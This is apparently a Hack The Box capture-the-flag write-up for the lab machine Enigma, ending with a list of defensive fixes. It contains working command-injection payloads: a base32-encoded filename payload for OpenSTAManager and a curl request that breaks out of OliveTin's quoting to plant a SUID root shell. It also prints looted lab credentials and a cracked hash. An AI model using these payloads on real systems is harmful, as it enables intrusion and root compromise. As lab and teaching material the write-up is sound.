# Hack The Box — Enigma

- **Target:** 10.129.239.191 (`enigma.htb`)
- **OS:** Linux
- **Difficulty:** Medium
- **Date:** 2026-07-04
- **Result:** Rooted 🚩

| Flag | Value |
|------|-------|
| user.txt | `8fe59e0f…` *(redacted — HTB lab flag)* |
| root.txt | `36806f9c…` *(redacted — HTB lab flag)* |

---

## The chain

```
NFS /srv/nfs/onboarding (world-readable) → New_Employee_Access.pdf
  └─ webmail kevin:Enigma2024! → Roundcube mailbox
       └─ password reuse → sarah mailbox → OpenSTAManager admin:Ne3s4rtars78s
            └─ OpenSTAManager 2.9.8 → CVE-2025-69212 (.p7m cmd injection) → www-data
                 └─ config.inc.php → DB → zz_users haris bcrypt → hashcat → bestfriends
                      └─ SSH is key-only → su haris → user.txt
                           └─ root OliveTin :1337 backup_database → password-arg injection → root
```

---

## 1. Recon

Port 80 is virtual-hosted into two apps: `mail001.enigma.htb` (Roundcube webmail) and
`support_001.enigma.htb` (OpenSTAManager 2.9.8). Dovecot (110/143/993/995) and **NFS (2049)** are
also up.

```bash
showmount -e 10.129.239.191
# Export list:  /srv/nfs/onboarding *
mount -t nfs -o ro,nolock 10.129.239.191:/srv/nfs/onboarding /mnt
# → New_Employee_Access.pdf   (kevin : Enigma2024!  for webmail)
```

## 2. Mail reuse → OpenSTAManager admin

`kevin:Enigma2024!` logs into Roundcube. Kevin's inbox is empty, but the **same password** works for
**sarah** (reuse). Sarah's inbox holds an IT provisioning email for OpenSTAManager:

```
http://support_001.enigma.htb   admin : Ne3s4rtars78s
```

## 3. Web RCE — CVE-2025-69212

OpenSTAManager ≤ 2.9.8 passes an uploaded `.p7m` invoice filename into `exec()` with `openssl`,
inside double quotes — where `$( )` still evaluates. Filenames can't hold `/`, so the payload is
base32-encoded and decoded at runtime.

```
# sink — src/Util/XML.php::decodeP7M()
exec('openssl smime -verify -noverify -in "'.$file.'" -inform DER ...');
# filename:  z$(echo${IFS}<B32>|base32${IFS}-d|bash).p7m
```

```bash
python3 exploit.py -u http://support_001.enigma.htb -l admin -p 'Ne3s4rtars78s' -c 'id'
# [+] authenticated
# uid=33(www-data) gid=33(www-data) groups=33(www-data)   @ enigma
```

## 4. Loot

From `www-data`:

```
# /var/www/html/openstamanager/config.inc.php
$db_username = 'brollin';   $db_password = 'Fri3nds@9099';

# /var/www/html/roundcube/config/config.inc.php
db_dsnw = mysql://roundcube:Yo270x26!gTx02@localhost/roundcubemail
des_key = mUW4idQIgKeYum1hcONJCkCR

# openstamanager.zz_users
haris  $2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC
```

`haris` (uid 1000) is the only real shell user on the box.

## 5. Privesc to user — crack + su

Known passwords miss; hashcat cracks the cost-10 bcrypt against `rockyou`:

```bash
hashcat -m 3200 haris.hash /usr/share/wordlists/rockyou.txt
# $2y$10$WHf1...Dr6eC : bestfriends
```

SSH refuses passwords for haris (`publickey` only), but we already have a shell — so `su` works:

```bash
echo 'bestfriends' | su haris -c 'id; cat /home/haris/user.txt'
# uid=1000(haris) …  → user.txt
# (then drop an SSH key into ~haris/.ssh/authorized_keys for a stable session)
```

## 6. Root — OliveTin command injection

A root process listens on `127.0.0.1:1337`: **OliveTin** 3000.10.0, a web UI that runs configured
shell commands as buttons. Its config allows unauthenticated guests to execute
(`authRequireGuestsToLogin: false`, `exec: true`), and the **Backup Database** action interpolates an
unsanitized `password`-type argument into a single-quoted shell string:

```yaml
shell: "mysqldump -u {{ db_user }} -p'{{ db_pass }}' {{ db_name }} > /opt/backups/backup.sql"
arguments:
  - name: db_pass
    type: password        # free-form → breaks out of the single quotes
```

Break out of the quotes to run as root, then use a SUID bash:

```bash
curl -s -X POST http://127.0.0.1:1337/api/StartActionAndWait -H 'Content-Type: application/json' \
  -d '{"actionId":"backup_database","arguments":[
       {"name":"db_user","value":"backup_svc"},
       {"name":"db_pass","value":"x'\''; cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash; echo '\''"},
       {"name":"db_name","value":"production"}]}'
# output: … uid=0(root) …   user: guest

/tmp/rootbash -p -c 'id; cat /root/root.txt'
# uid=1000(haris) euid=0(root) → root.txt
```

> **Note:** `chmod 4755` *then* `chown` clears the SUID bit — set ownership first (or skip it, since
> a root-run `cp` already owns the file), and apply `chmod 4755` last.

---

## Fixes

- **NFS:** don't export onboarding material world-readable; never ship a live password in a PDF.
- **Password reuse:** one credential opened two mailboxes, an app admin, and a shell account.
- **OpenSTAManager:** patch past 2.9.8; never build a shell string from a filename/external input.
- **OliveTin:** execute actions as an `exec` argv array (no shell), validate argument regexes,
  require auth, and don't run guest actions as root.

*Authorized lab work only — Enigma is a Hack The Box machine on a sanctioned network.*
